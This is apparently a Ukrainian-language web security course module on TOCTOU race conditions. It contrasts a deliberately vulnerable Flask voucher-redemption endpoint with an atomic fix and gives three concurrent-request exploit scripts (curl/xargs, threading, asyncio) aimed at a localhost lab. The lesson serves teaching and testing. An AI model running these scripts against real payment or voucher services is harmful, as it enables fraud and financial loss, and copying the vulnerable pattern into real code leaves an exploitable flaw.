Модуль 20 — Race Conditions

Досліди, як вади TOCTOU (Time-of-Check to Time-of-Use) дозволяють атакуючим експлуатувати часові проміжки в конкурентних операціях.

Вразливість, яку сканери не знайдуть

Race conditions фундаментально відрізняються від усіх інших вразливостей у цьому курсі. SQLi, XSS, SSRF — вони всі про те, що ти відправляєш. Race conditions — про те, коли ти це відправляєш. Пейлоад — це абсолютно нормальний запит. Експлойт полягає у відправці його в точно потрібний момент — або, точніше, у відправці багатьох його копій в один і той самий момент.

Саме тому автоматизовані сканери вразливостей майже ніколи не знаходять race conditions. Вони тестують по одному запиту за раз і аналізують відповідь. Race conditions проявляються лише тоді, коли кілька запитів потрапляють на один і той самий ендпоінт одночасно, створюючи вікно, в якому припущення додатка про стан тимчасово хибні.

TOCTOU — Time-of-Check to Time-of-Use

Ключовий патерн називається TOCTOU: сервер перевіряє умову (чи достатньо у користувача балансу? чи ваучер ще дійсний?), а потім використовує цю умову для дії (списує баланс, позначає ваучер як використаний). Між перевіркою та дією є проміжок — можливо, кілька мілісекунд, а можливо й більше, якщо між ними є запит до бази даних або мережевий виклик. Якщо інший запит проскочить у цей проміжок, він теж пройде перевірку, бо перший запит ще не оновив стан.

Вразливий код

@app.route('/redeem', methods=['POST'])
def redeem():
    code = request.form['code']

    # CHECK: is the voucher valid and unredeemed?
    voucher = db.execute(
        'SELECT * FROM vouchers WHERE code=? AND redeemed=0', (code,)
    ).fetchone()

    if not voucher:
        return 'Invalid or already redeemed'

    # ← TOCTOU GAP: between the CHECK above and the USE below,
    #   another request can also pass the check
    #   because redeemed is still 0 in the database

    # USE: mark as redeemed and credit the account
    db.execute('UPDATE vouchers SET redeemed=1 WHERE code=?', (code,))
    db.execute('UPDATE accounts SET balance=balance+? WHERE id=?',
               (voucher['value'], user_id))
    db.commit()
    return 'Voucher redeemed!'

Якщо 20 запитів прийдуть одночасно, вони всі виконають SELECT приблизно в один і той самий час. Всі побачать redeemed=0. Всі пройдуть перевірку. Всі зарахують кошти на рахунок. Один ваучер, 20 зарахувань. Це і є race condition.

Безпечний код — атомарні операції

@app.route('/redeem', methods=['POST'])
def redeem():
    code = request.form['code']

    # SAFE: check and modify in a SINGLE atomic query
    # Only ONE of the concurrent requests will match the WHERE clause
    result = db.execute(
        'UPDATE vouchers SET redeemed=1 WHERE code=? AND redeemed=0', (code,)
    )

    if result.rowcount == 0:
        return 'Invalid or already redeemed'

    # Only the winning request reaches here
    db.execute('UPDATE accounts SET balance=balance+? WHERE id=?',
               (voucher_value, user_id))
    db.commit()
    return 'Voucher redeemed!'

Виправлення об'єднує перевірку та модифікацію в один запит UPDATE...WHERE. База даних гарантує його атомарність — лише один із конкурентних запитів успішно оновить рядок (бо після того, як перший встановить redeemed=1, WHERE-умова решти вже не спрацює).

Реальні сценарії Race Conditions

  • Подвійне списання: активувати ту саму подарункову карту, купон або промокод кілька разів
  • Овердрафт: одночасно відправити кілька запитів на зняття коштів, щоб зняти більше, ніж є на балансі
  • Дублювання реєстрації: створити кілька акаунтів з "унікальним" іменем або email, обігнавши перевірку унікальності
  • Накрутка лайків/голосів: поставити "лайк" посту сотні разів, відправляючи конкурентні запити до виконання перевірки на дублікати
  • Зловживання запрошеннями: використати одноразове посилання-запрошення кілька разів
  • Перезапис файлів при завантаженні: одночасно завантажити два файли з логікою колізії імен, що ламається при конкурентному доступі
Реальна історія: У 2023 році Джеймс Кеттл з PortSwigger опублікував революційне дослідження "single-packet attacks" для HTTP/2. Відправляючи кілька HTTP/2-запитів в одному TCP-пакеті, він зміг усунути мережевий джитер і створити надзвичайно вузькі вікна гонки — часто лише кілька мікросекунд. Це зробило race conditions експлуатованими навіть коли TOCTOU-проміжок був мізерно малим. Техніку додали до інструменту Turbo Intruder у Burp Suite.

Техніки експлуатації

# Method 1: curl with xargs for parallel requests
seq 20 | xargs -P20 -I{} curl -sX POST http://localhost:5013/redeem \
  -d "code=GIFT-CARD-123"

# Method 2: Python threading for precise timing
import threading, requests

def redeem():
    requests.post('http://localhost:5013/redeem',
                  data={'code': 'GIFT-CARD-123'})

threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads: t.start()   # Launch all at once
for t in threads: t.join()    # Wait for completion
# Method 3: asyncio for maximum concurrency
import asyncio, aiohttp

async def race():
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post('http://localhost:5013/redeem',
                        data={'code': 'GIFT-CARD-123'})
            for _ in range(50)
        ]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

Вплив: Race conditions спричиняють фінансові втрати (подвійне списання), пошкодження даних, ескалацію привілеїв та обхід перевірок безпеки. Їх надзвичайно складно виявити автоматичним скануванням, і вони зазвичай вимагають ручного тестування з інструментами для конкурентних запитів. У баг-баунті програмах race conditions на фінансових операціях (платежі, кредити, перекази) зазвичай оцінюються як High або Critical.
